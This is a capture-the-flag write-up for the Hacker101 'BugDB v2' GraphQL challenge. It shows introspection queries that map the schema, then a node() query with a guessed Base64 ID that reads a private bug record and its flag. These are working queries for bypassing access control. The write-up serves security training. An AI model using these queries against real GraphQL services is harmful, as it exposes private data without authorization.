# BugDB v2
- Platform: Hacker101
- Category: Web, GraphQL 
- Difficulty: Easy

## Flag0
Hints:
- What has changed since last version?
- What do the queries tell you?
- Have you tried a mutation?

The GraphQL endpoint was explored to enumerate all available queries and understand the API’s capabilities. 
```
{
  __schema {
    queryType {
      fields {
        name
      }
    }
  }
}
```
<img width="1475" height="585" alt="image" src="https://github.com/user-attachments/assets/e55971a3-c04e-4cda-9e57-f522300e868c" /> <br><br>

The return types of each query were inspected, confirming that allBugs and node were accessible.
```
{
  __type(name: "Query") {
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

```
<img width="1382" height="827" alt="image" src="https://github.com/user-attachments/assets/c5cbc72c-d80f-4658-a0b4-5640352187c6" /> <br><br>

All fields of a bug object were explored, revealing a hidden text field that was not visible in the web interface.
```
{
  __type(name: "Bugs") {
    name
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```
<img width="1275" height="792" alt="image" src="https://github.com/user-attachments/assets/46b19240-0f68-4704-89dc-258b7061dbd3" /> <br><br>

Public bug entries were retrieved, showing that bug IDs were Base64-encoded and followed a predictable pattern.
```
{
  allBugs {
    id
    private
    text
  }
}
```
<img width="1353" height="311" alt="image" src="https://github.com/user-attachments/assets/e17f8297-45e8-4e32-88c9-66aae4a10901" /> <br><br>

The ```node()``` query was used with another Base64-encoded ID to access a private bug directly. The hidden text field contained the flag.
```
{
  node(id: "QnVnczoy") {
    ... on Bugs {
      id
      private
      text
    }
  }
}
```
<img width="1738" height="317" alt="image" src="https://github.com/user-attachments/assets/5dc64fac-3d0a-4047-b96b-77199cee5190" />




